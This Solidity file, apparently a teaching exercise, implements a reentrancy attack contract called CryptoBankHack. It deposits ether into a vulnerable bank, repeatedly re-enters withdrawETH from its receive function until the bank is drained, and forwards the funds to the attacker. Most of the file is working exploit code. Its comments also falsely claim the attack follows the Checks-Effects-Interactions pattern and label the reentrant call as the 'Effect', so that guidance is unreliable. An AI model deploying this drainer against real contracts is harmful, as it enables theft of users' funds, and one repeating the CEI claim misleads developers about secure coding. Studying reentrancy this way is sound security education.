/*
@title CryptoBankHack (Reentrancy Attack Contract)
@notice This contract demonstrates a reentrancy attack on a vulnerable contract (CryptoBank). It exploits the reentrancy vulnerability to drain the funds of the target contract and transfer them to the attacker's account.
@dev Implements the reentrancy attack by interacting with the CryptoBank contract. The attack function triggers a deposit followed by withdrawal, exploiting the fallback function to re-enter the withdrawal function, thereby draining funds.

Objectives: 
(a) Define an interface to interact with the target contract (CryptoBank).
(b) Create a constructor that sets the target contract's address and initializes the attacker's account.
(c) Implement the attack function, which deposits and then calls the vulnerable withdrawal function.
(d) Utilize the fallback function to execute the reentrancy attack, eventually transferring the drained funds to the attacker.

Methodology and Thinking Process:

The primary objectives of the CryptoBankHack contract are to:
(1) Drain the funds of CryptoBank, a target contract that is vulnerable to a reentrancy attack.
(2) Deposit the drained funds into the attacker's account.

To accomplish these objectives, the contract takes the following steps:
- Creates an attack function that initiates a deposit to CryptoBank.
- Deposits money to CryptoBank using depositETH() from the attack function.
- Calls withdrawETH() from the attack function, immediately after the deposit.
- Triggers the fallback (receive) function in CryptoBankHack contract.
- The fallback function calls withdrawETH() again, re-entering the withdrawal function.
- Once the balance of CryptoBank is zero, transfers the drained funds to the attacker's account.

The setup required to execute this process includes:
- Interaction with the CryptoBank contract through an interface, including:
    - The constructor taking in the address of the CryptoBank contract to set up the target.
    - Creating an interface with all required functions marked external.
    - Defining an interface variable to facilitate interaction with CryptoBank.
    - Assigning the interface variable to the address of the CryptoBank contract within the constructor.
- Implementing the attack function with specific attributes:
    - Marking it payable, enabling the deposit of funds to CryptoBank.
    - Combining the deposit to CryptoBank and the call to withdrawETH().
- Crafting the fallback function (receive), adhering to the Checks-Effects-Interactions (CEI) pattern:
    - Marking it payable.
    - Checking if the balance of CryptoBank is greater than zero.
    - Calling withdrawETH() again if the balance is positive, or transferring the funds to the attacker's account otherwise.
    - Ensuring the definition of the attacker's account variable as a payable address.
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0; 

/* 
@custom:objective (a) Define an interface to interact with the target contract (CryptoBank).
The interface includes functions needed to deposit and withdraw Ether from the CryptoBank contract.
*/
interface IEtherBank {
    function depositETH() external payable;
    function withdrawETH() external;
}

contract CryptoBankHack {

    // Define variables

    /*
    @dev Represents the target contract (CryptoBank) that we want to attack. It allows interaction with its deposit and withdrawal functions.
    */
    IEtherBank target;

    /*
    @dev The address of the attacker. Funds will be transferred here once the attack is successful.
    */
    address payable attacker;

    /*
    @custom:objective (b) Create a constructor that sets the target contract's address and initializes the attacker's account.
    The constructor initializes the target variable with the CryptoBank contract's address and sets the attacker variable as the sender's address.
    */
    constructor (address _bankAddress) {
        target = IEtherBank(_bankAddress);
        attacker = payable(msg.sender);
    }


    /*
    @custom:objective (c) Implement the attack function, which deposits and then calls the vulnerable withdrawal function.
    This function allows the attacker to initiate the attack by depositing Ether to the target contract and immediately calling the withdrawETH function.
    */
    function attack () external payable {
        target.depositETH{value: 1 ether}(); // Depositing 1 ether to the target contract
        target.withdrawETH(); // Calling the withdrawal function of the target contract
    }

    /*
    @custom:objective (d) Utilize the fallback function to execute the reentrancy attack, eventually transferring the drained funds to the attacker.
    The receive function will call the withdrawETH function repeatedly until the target contract's balance is 0, and then transfers the drained funds to the attacker.
    */
    receive () external payable {
        // Apply the Checks-Effects-Interactions (CEI) pattern
        // Check
        if (address(target).balance > 0 ) {
            // Effect
            target.withdrawETH();
        } else {
            // Interaction
            (bool success, ) = attacker.call{value: address(this).balance}("");
            require(success, "Withdraw failed");
        }
    }
}
